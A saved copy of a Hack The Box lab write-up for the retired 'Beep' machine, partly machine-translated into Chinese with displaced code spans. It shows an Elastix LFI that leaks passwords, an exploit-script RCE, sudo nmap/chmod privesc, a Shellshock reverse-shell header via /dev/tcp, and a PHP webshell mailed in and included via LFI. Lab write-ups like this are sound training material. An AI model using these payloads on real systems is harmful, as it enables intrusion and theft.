
LIF 信息泄露 web执行代码


# 0xdf黑客的东西

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webmin-path-2)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fbeep-cover.) 

Even when it was released there were many ways to own Beep. I’ll show five, all of which were possible when this box was released in 2017. Looking a the timestamps on my notes, I completed Beep in August 2018, so this writeup will be a mix of those plus new explorations. The box is centered around PBX software. I’ll exploit an LFI, RCE, two different privescs, webmin, credential reuse, ShellShock, and webshell upload over SMTP.

## Box Info

Name

[Beep](https://www.hackthebox.eu/home/machines/profile/5) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-beep.png) 

Release Date

15 Mar 2017

Retire Date

26 May 2017

OS

Linux  ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

Base Points

Easy \[20\]

Rated Difficulty

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fbeep-diff.png) 

Radar Graph

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fbeep-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

23 days, 18 hours, 30 mins, 10 seconds [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F56)](https://www.hackthebox.eu/home/users/profile/56)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

23 days, 18 hours, 30 mins, 24 seconds [![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F56)](https://www.hackthebox.eu/home/users/profile/56)

Creator

[![](https://image.cubox.pro/article/2022091814483344911/94821.jpg)](https://www.hackthebox.eu/home/users/profile/1)-

## Enumeration

### nmap

`nmap` shows a bunch of ports open on the box:

    root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.7
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 12:44 EDT
    Nmap scan report for 10.10.10.7
    Host is up (0.12s latency).
    Not shown: 65519 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    25/tcp    open  smtp
    80/tcp    open  http
    110/tcp   open  pop3
    111/tcp   open  rpcbind
    143/tcp   open  imap
    443/tcp   open  https
    745/tcp   open  unknown
    993/tcp   open  imaps
    995/tcp   open  pop3s
    3306/tcp  open  mysql
    4190/tcp  open  sieve
    4445/tcp  open  upnotifyp
    4559/tcp  open  hylafax
    5038/tcp  open  unknown
    10000/tcp open  snet-sensor-mgmt
    
    Nmap done: 1 IP address (1 host up) scanned in 15.41 seconds
    
    root@kali# nmap -sC -sV -p 22,25,80,110,111,143,443,745,993,995,3306,4190,4445,4559,5038,10000 -oA nmap/scriptstcp 10.10.10.7
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 12:46 EDT
    Nmap scan report for 10.10.10.7
    Host is up (0.12s latency).
    
    PORT      STATE SERVICE    VERSION
    22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
    |_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
    25/tcp    open  smtp       Postfix smtpd
    |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    80/tcp    open  http       Apache httpd 2.2.3
    |_http-server-header: Apache/2.2.3 (CentOS)
    |_http-title: Did not follow redirect to https://10.10.10.7/
    110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
    |_pop3-capabilities: STLS PIPELINING EXPIRE(NEVER) LOGIN-DELAY(0) TOP IMPLEMENTATION(Cyrus POP3 server v2) APOP RESP-CODES UIDL USER AUTH-RESP-CODE
    111/tcp   open  rpcbind    2 (RPC #100000)
    | rpcinfo: 
    |   program version   port/proto  service
    |   100000  2            111/tcp  rpcbind
    |   100000  2            111/udp  rpcbind
    |   100024  1            742/udp  status
    |_  100024  1            745/tcp  status
    143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
    |_imap-capabilities: SORT=MODSEQ Completed IMAP4rev1 RENAME OK URLAUTHA0001 X-NETSCAPE UNSELECT ACL BINARY LISTEXT QUOTA ID IDLE MULTIAPPEND CONDSTORE CATENATE ANNOTATEMORE LIST-SUBSCRIBED THREAD=ORDEREDSUBJECT LITERAL+ THREAD=REFERENCES NO UIDPLUS CHILDREN MAILBOX-REFERRALS SORT STARTTLS NAMESPACE ATOMIC IMAP4 RIGHTS=kxte
    443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: Apache/2.2.3 (CentOS)
    |_http-title: Elastix - Login page
    | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
    | Not valid before: 2017-04-07T08:22:08
    |_Not valid after:  2018-04-07T08:22:08
    |_ssl-date: 2018-08-09T15:27:00+00:00; -1h21m36s from scanner time.
    745/tcp   open  status     1 (RPC #100024)
    993/tcp   open  ssl/imap   Cyrus imapd
    |_imap-capabilities: CAPABILITY
    995/tcp   open  pop3       Cyrus pop3d
    3306/tcp  open  mysql      MySQL (unauthorized)
    4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
    4445/tcp  open  upnotifyp?
    4559/tcp  open  hylafax    HylaFAX 4.3.10
    5038/tcp  open  asterisk   Asterisk Call Manager 1.1
    10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
    Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
    
    Host script results:
    |_clock-skew: mean: -1h21m36s, deviation: 0s, median: -1h21m36s
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 279.65 seconds
    

The Apache version says the box is CentOS, so it’s likely [CentOS 5](https://access.redhat.com/solutions/445713) (which is super old).

### Web - Port 80/443

#### Site

Port 80 just returns a redirect to port 443 / HTTPS.

On 443 there’s an an Elastix login page:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1533834127535.png) 

[Elastix](https://www.elastix.org/) is a private branch exchange (PBX) software. A PBX controls a telephone / voice network within a corporate network, connecting it to the rest of the network. This very much fits the theme of the box name, Beep.

#### Directory Bruteforce

While I tend to use lately, I used to use more regularly. They are both good tools. In this case, finds several paths:`gobuster``dirsearch``dirsearch`

    
```
root@kali# dirsearch.py -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php -t 50                             
    
     _|. _ _  _  _  _ _|_    v0.3.8
    (_||| _) (/_(_|| (_| )
    
    Extensions: txt, php | Threads: 50 | Wordlist size: 220521
    
    Error Log: /opt/dirsearch/logs/errors-18-08-09_12-59-00.log
    
    Target: https://10.10.10.7/
    
    [12:59:01] Starting: 
    [12:59:04] 301 -  310B  - /images  ->  https://10.10.10.7/images/
    [12:59:05] 200 -    2KB - /
    [12:59:05] 301 -  308B  - /help  ->  https://10.10.10.7/help/
    [12:59:09] 301 -  311B  - /modules  ->  https://10.10.10.7/modules/
    [12:59:09] 301 -  310B  - /themes  ->  https://10.10.10.7/themes/
    [12:59:12] 301 -  308B  - /mail  ->  https://10.10.10.7/mail/
    [12:59:17] 301 -  309B  - /admin  ->  https://10.10.10.7/admin/
    [12:59:17] 301 -  310B  - /static  ->  https://10.10.10.7/static/
    [13:00:24] 301 -  308B  - /lang  ->  https://10.10.10.7/lang/
    [13:04:39] 301 -  307B  - /var  ->  https://10.10.10.7/var/
    [13:05:41] 301 -  309B  - /panel  ->  https://10.10.10.7/panel/
    [13:14:34] 301 -  308B  - /libs  ->  https://10.10.10.7/libs/
    [13:29:14] 301 -  314B  - /recordings  ->  https://10.10.10.7/recordings/
    [13:47:37] 301 -  311B  - /configs  ->  https://10.10.10.7/configs/
    [16:52:04] 301 -  313B  - /vtigercrm  ->  https://10.10.10.7/vtigercrm/
    
    Task Completed
```

    

#### /admin

Going to , it prompts for login:`/admin`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1533834218123.png) 

After a few guesses, I’ll hit cancel and end up at , which prints an unauthorized message:`https://10.10.10.7/admin/config.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1533834248938.png) 

#### LFI

Searchsploit shows an LFI in Elastix:

   
```
 root@kali# searchsploit elastix
    ------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                                                                                                   |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)               
    ------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Elastix - 'page' Cross-Site Scripting                                                                                                            | exploits/php/webapps/38078.py         
    Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                          | exploits/php/webapps/38544.txt        
    Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                    | exploits/php/webapps/34942.txt        
    Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                 | exploits/php/webapps/37637.pl         
    Elastix 2.x - Blind SQL Injection                                                                                                                | exploits/php/webapps/36305.txt        
    Elastix < 2.5 - PHP Code Injection                                                                                                               | exploits/php/webapps/38091.php        
    FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                           | exploits/php/webapps/18650.py         
    ------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```

    

`searchsploit -x exploits/php/webapps/37637.pl` shows an local file include (LFI) in the page. The parameter points to a file, and it looks like there’s no filtering of and I can pass to truncate the string. That suggests that the PHP is taking the input and appending to it before it includes. On really old PHP instances, adding would truncate the string, so the would be ignored.`/vtigercrm/graph.php``current_language``../``%00``%00``.php``%00``.php`

It works just like the POC suggested:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1533841404662.png) 

I could read other files as well, but the POC suggested a config file for the PBX, and it contains a bunch of potential passwords in there to grab:

*   amp109
*   jEhdIekWmdjE
*   amp111
*   passw0rd

### Webmin - TCP 10000

On port 10000 there’s a Webmin login:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210218143204504.png) 

[Webmin](https://www.webmin.com/) is a web interface for managing Unix systems. I guess some basic passwords like root / root, but no success. I’ll try the passwords from the LFI in a later section.

### SMTP - TCP 25

With SMTP, I can check user accounts. I’ll cheat a bit, since I have the LFI and can read to generate a list of users from it:`/etc/passwd`

    root@kali$ cat usernames_from_passwd 
    sync
    shutdown
    halt
    news
    mysql
    cyrus
    asterisk
    spamfilter
    fanis
    

I can use to connect (I’ll make the stuff I type with ):`telnet``<--`

    root@kali$ telnet 10.10.10.7 25
    Trying 10.10.10.7...
    Connected to 10.10.10.7.
    Escape character is '^]'.
    220 beep.localdomain ESMTP Postfix
    EHLO 0xdf   <-- doesn't matter what's after EHLO
    250-beep.localdomain
    250-PIPELINING
    250-SIZE 10240000
    250-VRFY
    250-ETRN
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250 DSN
    VRFY spamfilter@localhost  <-- ask to verify this account
    252 2.0.0 spamfilter@localhost
    VRFY 0xdf@localhost        <-- this request should fail
    550 5.1.1 <0xdf@localhost>: Recipient address rejected: User unknown in local recipient table
    VRFY fanis                 <-- don't need the localhost either
    252 2.0.0 fanis
    VRFY cyrus
    252 2.0.0 cyrus
    

If I didn’t have the LFI, I could still use a script to try tons of names and record the ones that are valid.

## Multiple Paths

When I solved this in 2018 there were several paths to root from here:

1.  RCE via 18650.py
2.  Webmin
3.  SSH as root
4.  Shellshock
5.  WebShell

I suspect there are more now, but these seem like a good start.

## RCE via 18650.py \[Path #1\]

### Shell as asterisk

Searchsploit shows several Elastix vulns. The last one seems interesting, and mentions a version of FreePBX that’s later than this one:

    root@kali# searchsploit elastix
    ------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                                                                                                   |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
    ------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Elastix - 'page' Cross-Site Scripting                                                                                                            | exploits/php/webapps/38078.py
    Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                          | exploits/php/webapps/38544.txt
    Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                    | exploits/php/webapps/34942.txt
    Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                 | exploits/php/webapps/37637.pl
    Elastix 2.x - Blind SQL Injection                                                                                                                | exploits/php/webapps/36305.txt
    Elastix < 2.5 - PHP Code Injection                                                                                                               | exploits/php/webapps/38091.php
    FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                           | exploits/php/webapps/18650.py
    ------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

Grabbing it (), just running it will throw some errors. In my notes from 2018, I had to make three changes:`searchsploit -m exploits/php/webapps/18650.py`

1.  Update my IP and port to get a callback.
2.  Update to ignore bad ssl certs
3.  Find the extension

The first is easy. The second took some Googling, but I found I could create an SSL context that said to ignore the certificate errors, and pass it into the request like this:

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    urllib.urlopen(url, context=ctx) 
    

The last one is an issue specific to the instance of the PBX. I need an open extension, so I’ll use to look for one:`svwar`

    root@kali# svwar -m INVITE -e100-999 10.10.10.7
    WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
    | Extension | Authentication |
    ------------------------------
    | 233       | reqauth        |
    

I’ll add that to the script where it defines .`extension`

In 2018, I could run this script, and get a shell. In 2021, it throws more errors:

    root@kali$ python2 18650.py
    ...[snip]...
    IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
    

This server is so old it’s using a protocol for SSL below what my machine will allow. will show the versions that Beep is supporting:`sslscan`

    root@kali$ sslscan 10.10.10.7
    Version: 2.0.6-static
    OpenSSL 1.1.1i-dev  xx XXX xxxx
    
    Connected to 10.10.10.7
    
    Testing SSL server 10.10.10.7 on port 443 using SNI name 10.10.10.7
                                                   
      SSL/TLS Protocols:                           
    SSLv2     disabled                             
    SSLv3     enabled                              
    TLSv1.0   enabled                              
    TLSv1.1   disabled                             
    TLSv1.2   disabled                             
    TLSv1.3   disabled
    

All best practice is to disable TLSv1.0 and all SSL versions, so my host isn’t allowing a connection to this box. I can change what my VM allows in , finding the line for and changing it to , like this:`/etc/ssl/openssl.cnf``MinProtocol``None`

    [system_default_sect]
    #MinProtocol = DEFAULT@SECLEVEL=2
    MinProtocol = None
    #CipherString = DEFAULT@SECLEVEL=2
    CipherString = None
    

I’ll need to do it for the as well, or it will throw a different error. Once I have that, running results in a connection and a shell:`CipherString``python 18650.py`

    root@kali# nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.7] 56205
    id
    uid=100(asterisk) gid=101(asterisk)
    

### Privesc to root

#### nmap

The comments in the exploit script suggest using to get to root, and that does work. I’ll run as root and then to run a command, like :`sudo nmap``nmap``![command]``bash`

    sudo nmap --interactive
    
    Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
    Welcome to Interactive Mode -- press h <enter> for help
    nmap> !bash
    bash-3.2# id
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
    bash-3.2# cat /root/root.txt
    f2b76a2d************************
    

#### chmod

`sudo -l` shows there are a ton of things asterisk can run without a password as root:

    bash-3.2$ sudo -l
    Matching Defaults entries for asterisk on this host:
        env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
        LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
        LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
        LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
        XAUTHORITY"
    
    User asterisk may run the following commands on this host:
        (root) NOPASSWD: /sbin/shutdown
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/bin/yum
        (root) NOPASSWD: /bin/touch
        (root) NOPASSWD: /bin/chmod
        (root) NOPASSWD: /bin/chown
        (root) NOPASSWD: /sbin/service
        (root) NOPASSWD: /sbin/init
        (root) NOPASSWD: /usr/sbin/postmap
        (root) NOPASSWD: /usr/sbin/postfix
        (root) NOPASSWD: /usr/sbin/saslpasswd2
        (root) NOPASSWD: /usr/sbin/hardware_detector
        (root) NOPASSWD: /sbin/chkconfig
        (root) NOPASSWD: /usr/sbin/elastix-helper
    

`chmod` jumps out right away. I’ll pick a file, like , and set it to SUID:`/bin/bash`

    bash-3.2$ ls -l /bin/bash
    -rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
    bash-3.2$ sudo chmod 4755 /bin/bash
    bash-3.2$ ls -l /bin/bash
    -rwsr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
    

Now just run it (with to not drop privs) and get a root shell:`-p`

    bash-3.2$ bash -p
    bash-3.2# id
    uid=100(asterisk) gid=101(asterisk) euid=0(root)
    

## 韦伯明 \[路径 #2\]

尝试使用我从LFI收集的密码的用户名根，我可以登录到具有根/ jehdIekWmdjE的网络。此接口旨在管理计算机，并具有完全的 root 访问权限：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210218143335619.png) 

登录这里，我基本上拥有这个系统。我可以更改任何用户的密码（见上图），计划crons，安装软件包或以任何用户身份运行命令。

我将创建一个作为 root 的任务：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210218143717829.png) 

一分钟后，当它运行时，一个外壳来到：`nc`

    root@kali$ sudo nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.7] 37697
    bash: no job control in this shell
    [root@beep /]# id
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
    

## 作为根的 SSH \[路径 #3\]

webmin的根登录名是根帐户密码是正常的，这里就是这种情况，因为“jEhdIekWmdjE”密码适用于作为根的SSH：

    root@kali# ssh root@10.10.10.7
    root@10.10.10.7's password:
    Last login: Fri Aug 25 18:05:54 2017
    
    Welcome to Elastix
    ----------------------------------------------------
    
    To access your Elastix System, using a separate workstation (PC/MAC/Linux)
    Open the Internet Browser using the following URL:
    http://10.10.10.7
    
    [root@beep ~]#
    

## 炮击 \[路径 #4\]

如果我假设我没有root密码，我可以尝试登录webmin进行一些猜测。当我尝试登录时，它会创建一个 POST 请求：`/session_login.cgi`

    POST /session_login.cgi HTTP/1.1
    Host: 10.10.10.7:10000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 28
    Origin: https://10.10.10.7:10000
    DNT: 1
    Connection: close
    Referer: https://10.10.10.7:10000/
    Cookie: testing=1; sid=x
    Upgrade-Insecure-Requests: 1
    
    page=%2F&user=root&pass=root
    

任何时候有CGI（_特别是在_旧机器上），就该寻找[《炮弹奇兵》](https://en.wikipedia.org/wiki/Shell_shock)了。为了进行测试，我将登录请求转到中继器，并将标头替换为 Shellshock 漏洞利用字符串 ，从简单的睡眠开始：`User-Agent``() { :; };[cmd]`

    POST /session_login.cgi HTTP/1.1
    Host: 10.10.10.7:10000
    User-Agent: () { :; };sleep 10
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 28
    Origin: https://10.10.10.7:10000
    DNT: 1
    Connection: close
    Referer: https://10.10.10.7:10000/
    Cookie: testing=1; sid=x
    Upgrade-Insecure-Requests: 1
    
    page=%2F&user=root&pass=root
    

It hangs for 10 seconds and then returns. I’ll try a :`ping`

    POST /session_login.cgi HTTP/1.1
    Host: 10.10.10.7:10000
    User-Agent: () { :; };ping -c 1 10.10.14.2
    Content-Length: 28
    
    page=%2F&user=root&pass=root
    

At , I see it arrive:`tcpdump`

    root@kali$ sudo tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    14:46:35.325588 IP 10.10.10.7 > 10.10.14.2: ICMP echo request, id 23824, seq 1, length 64
    14:46:35.325599 IP 10.10.14.2 > 10.10.10.7: ICMP echo reply, id 23824, seq 1, length 64
    

So now can get shell (as root):

    POST /session_login.cgi HTTP/1.1
    Host: 10.10.10.7:10000
    User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.2/8081 0>&1
    Content-Length: 28
    
    page=%2F&user=root&pass=root
    

    root@kali# nc -lnvp 8081
    listening on [any] 8081 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.7] 36248
    bash: no job control in this shell
    [root@beep webmin]# id
    uid=0(root) gid=0(root)
    

## Webshell Upload \[Path #5\]

### Get WebShell on Beep

#### Failures

Because I have a local file include, if I can get a webshell onto the host, then I can get execution that way. I tried a bunch of things:

*   Log Poisoning - I can put a PHP webshell into the User-Agent header and it’ll be logged in the . Unfortunately, I can’t read that file via the LFI. I’ve shown this [several times before](https://0xdf.gitlab.io/tags.html#log-poisoning).`access_log`
*   When I try to log into the Elastix web interface, it assigns a cookie, that looks like . Data about this session is stored at , and I can access this file. Unfortunately, the files remain empty, I’m guessing until I’m able to log in. This is an attack I showed in [Unattended](https://0xdf.gitlab.io/2019/08/24/htb-unattended.html#shell).`elastixSession``ambb7h36cmt7cngc245ilj6hp4``/tmp/sess_ambb7h36cmt7cngc245ilj6hp4`
*   Instead of trying to access a file on the system, I tried to access , but this failed as well.`http://10.10.14.2/shell.php`

#### Email

One way to get a file on disk is email. I’ll send an email to one of the accounts on the box, and then find it in . Why not the askerisk account? will send the email (or I could do it with similar to the enumeration above):`/var/mail/[username]``swaks``telnet`

    root@kali$ swaks --to asterisk@localhost --from 0xdf@0xdf.htb --header "Subject: test shel
    l" --body 'check out this code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
    === Trying 10.10.10.7:25...                                  
    === Connected to 10.10.10.7.
    <-  220 beep.localdomain ESMTP Postfix
     -> EHLO parrot
    <-  250-beep.localdomain                                     
    <-  250-PIPELINING
    <-  250-SIZE 10240000
    <-  250-VRFY                                                 
    <-  250-ETRN                                                 
    <-  250-ENHANCEDSTATUSCODES
    <-  250-8BITMIME
    <-  250 DSN
     -> MAIL FROM:<0xdf@0xdf.htb>
    <-  250 2.1.0 Ok
     -> RCPT TO:<asterisk@localhost>
    <-  250 2.1.5 Ok
     -> DATA
    <-  354 End data with <CR><LF>.<CR><LF>
     -> Date: Thu, 18 Feb 2021 15:33:00 -0500
     -> To: asterisk@localhost
     -> From: 0xdf@0xdf.htb
     -> Subject: test shell
     -> Message-Id: <20210218153300.1486384@parrot>
     -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
     -> 
     -> check out this code: <?php system($_REQUEST["cmd"]); ?>
      ->                                                          
     ->                    
     -> .
    <-  250 2.0.0 Ok: queued as 5BB88D92FD                       
     -> QUIT                                                     
    <-  221 2.0.0 Bye
    === Connection closed with remote host.
    

### Webshell

Now I can read that file with the LFI at:

    view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action
    

I’ll add to get execution:`&cmd=id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210218154253978.png) 

I can turn that into a shell, and privesc just like in method one.

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webmin-path-2)